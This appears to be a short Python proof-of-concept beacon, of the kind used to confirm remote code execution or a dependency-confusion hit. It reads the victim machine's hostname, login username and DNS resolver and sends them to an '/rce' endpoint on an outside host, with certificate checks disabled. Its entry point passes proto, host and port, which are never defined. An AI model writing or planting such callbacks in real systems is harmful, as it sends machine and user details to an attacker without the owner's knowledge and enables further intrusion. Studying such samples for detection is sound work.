import os
import dns.resolver
import requests

def main(proto,host,port):
    url=proto+"://"+host+":"+port
    print('Sending request...')

    if os.name == 'nt':
        hostname=os.environ['COMPUTERNAME']
        username=os.getlogin()
        dnsd=dns.resolver.Resolver().nameservers[0]
        geturl=url+"/rce?hostname=%s&username=%s&dns=%s" % (hostname,username,dnsd)
        response = requests.get(geturl, verify=False)
        print(response.text)
    else:
        hostname=str(os.popen('hostname').read().replace("\n",""))
        username=os.getlogin()
        dnsd=dns.resolver.Resolver().nameservers[0]
        geturl=url+"/rce?hostname=%s&username=%s&dns=%s" % (hostname,username,dnsd)
        response = requests.get(geturl, verify=False)
        print(response.text)

if __name__ == '__main__':
    main(proto,host,port)
